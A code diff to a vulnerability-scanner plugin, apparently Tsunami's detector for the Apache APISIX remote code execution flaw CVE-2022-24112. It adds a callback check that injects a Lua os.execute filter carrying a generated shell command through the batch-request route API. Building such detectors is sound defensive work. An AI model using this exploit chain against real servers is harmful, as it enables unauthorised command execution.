@@ -15,6 +15,8 @@ import com.google.tsunami.common.time.UtcClock;
 import com.google.tsunami.plugin.PluginType;
 import com.google.tsunami.plugin.VulnDetector;
 import com.google.tsunami.plugin.annotations.PluginInfo;
+import com.google.tsunami.plugin.payload.Payload;
+import com.google.tsunami.plugin.payload.PayloadGenerator;
 import com.google.tsunami.proto.*;
 
 import javax.inject.Inject;
@@ -51,19 +53,27 @@ public final class Cve202224112Detector implements VulnDetector {
       "tsunami_rce/" + Long.toHexString(Double.doubleToLongBits(Math.random()));
   private static final String PIPE_REQUEST_BODY_NAME =
       Long.toHexString(Double.doubleToLongBits(Math.random()));
+
+  private static final String FILTER_FUNC_OS_RCE =
+      "function(vars) os.execute('%s'); return true end";
   private static final String FILTER_FUNC_OS_EXEC =
       "function(vars) return os.execute('echo hello')==true end";
   private static final String FILTER_FUNC_FALSE = "function(vars) return false end";
   private final Clock utcClock;
   private final HttpClient httpClient;
+
+  private final PayloadGenerator payloadGenerator;
   private String batchRequestBodyTemplate;
 
   @Inject
-  Cve202224112Detector(@UtcClock Clock utcClock, HttpClient httpClient) throws IOException {
+  Cve202224112Detector(
+      @UtcClock Clock utcClock, HttpClient httpClient, PayloadGenerator payloadGenerator)
+      throws IOException {
     this.utcClock = checkNotNull(utcClock);
     this.httpClient = checkNotNull(httpClient);
+    this.payloadGenerator = checkNotNull(payloadGenerator);
     batchRequestBodyTemplate =
-            Resources.toString(Resources.getResource(this.getClass(), "pipeRequestBody.json"), UTF_8);
+        Resources.toString(Resources.getResource(this.getClass(), "pipeRequestBody.json"), UTF_8);
   }
 
   @Override
@@ -82,6 +92,36 @@ public final class Cve202224112Detector implements VulnDetector {
   }
 
   private boolean isServiceVulnerable(NetworkService networkService) {
+    return (payloadGenerator.isCallbackServerEnabled() && isVulnerableWithCallback(networkService))
+        || isVulnerableWithoutCallback(networkService);
+  }
+
+  private boolean isVulnerableWithCallback(NetworkService networkService) {
+    PayloadGeneratorConfig config =
+        PayloadGeneratorConfig.newBuilder()
+            .setVulnerabilityType(PayloadGeneratorConfig.VulnerabilityType.REFLECTIVE_RCE)
+            .setInterpretationEnvironment(
+                PayloadGeneratorConfig.InterpretationEnvironment.LINUX_SHELL)
+            .setExecutionEnvironment(
+                PayloadGeneratorConfig.ExecutionEnvironment.EXEC_INTERPRETATION_ENVIRONMENT)
+            .build();
+
+    Payload payload = payloadGenerator.generate(config);
+    String cmd = payload.getPayload();
+
+    String filterFunc = String.format(FILTER_FUNC_OS_RCE, cmd);
+
+    var vulnRouteCreated = registerRouteRequest(networkService, filterFunc);
+    if (!vulnRouteCreated) return false;
+
+    Uninterruptibles.sleepUninterruptibly(Duration.ofSeconds(BATCH_REQUEST_WAIT_AFTER_TIMEOUT));
+
+    executeCreatedRouteRequest(networkService);
+
+    return payload.checkIfExecuted();
+  }
+
+  private boolean isVulnerableWithoutCallback(NetworkService networkService) {
     HttpResponse resp;
 
     var vulnRouteCreated = registerRouteRequest(networkService, FILTER_FUNC_OS_EXEC);
@@ -90,7 +130,8 @@ public final class Cve202224112Detector implements VulnDetector {
     Uninterruptibles.sleepUninterruptibly(Duration.ofSeconds(BATCH_REQUEST_WAIT_AFTER_TIMEOUT));
 
     resp = executeCreatedRouteRequest(networkService);
-    if (resp == null || !(resp.status().code() == HttpStatus.SERVICE_UNAVAILABLE.code()
+    if (resp == null
+        || !(resp.status().code() == HttpStatus.SERVICE_UNAVAILABLE.code()
             || resp.status().code() == HttpStatus.BAD_GATEWAY.code())) return false;
 
     var trueNegativeRouteCreated = registerRouteRequest(networkService, FILTER_FUNC_FALSE);
@@ -104,8 +145,7 @@ public final class Cve202224112Detector implements VulnDetector {
     return true;
   }
 
-  private HttpResponse executeBatchRequest(
-      NetworkService networkService, String filterFunc) {
+  private HttpResponse executeBatchRequest(NetworkService networkService, String filterFunc) {
     String targetUri = NetworkServiceUtils.buildWebApplicationRootUrl(networkService);
 
     HttpHeaders headers =
@@ -142,7 +182,7 @@ public final class Cve202224112Detector implements VulnDetector {
     HttpResponse resp = null;
     try {
       resp =
-              httpClient.send(
+          httpClient.send(
               post(targetUri + BATCH_REQUEST_PATH)
                   .setHeaders(headers)
                   .setRequestBody(ByteString.copyFromUtf8(batchRequestBody))
@@ -156,9 +196,10 @@ public final class Cve202224112Detector implements VulnDetector {
 
   private boolean registerRouteRequest(NetworkService networkService, String filterFunc) {
     HttpResponse resp = executeBatchRequest(networkService, filterFunc);
-    return resp != null && resp.status().code() == HttpStatus.OK.code()
-            && resp.bodyJson().isPresent()
-            && resp.bodyJson()
+    return resp != null
+        && resp.status().code() == HttpStatus.OK.code()
+        && resp.bodyJson().isPresent()
+        && resp.bodyJson()
             .get()
             .getAsJsonArray()
             .get(0)
@@ -199,7 +240,9 @@ public final class Cve202224112Detector implements VulnDetector {
         .setVulnerability(
             Vulnerability.newBuilder()
                 .setMainId(
-                    VulnerabilityId.newBuilder().setPublisher("TSUNAMI_COMMUNITY").setValue("CVE-2022-24112"))
+                    VulnerabilityId.newBuilder()
+                        .setPublisher("TSUNAMI_COMMUNITY")
+                        .setValue("CVE-2022-24112"))
                 .setSeverity(Severity.CRITICAL)
                 .setTitle("Apache APISIX RCE (CVE-2022-24112)")
                 .setDescription(
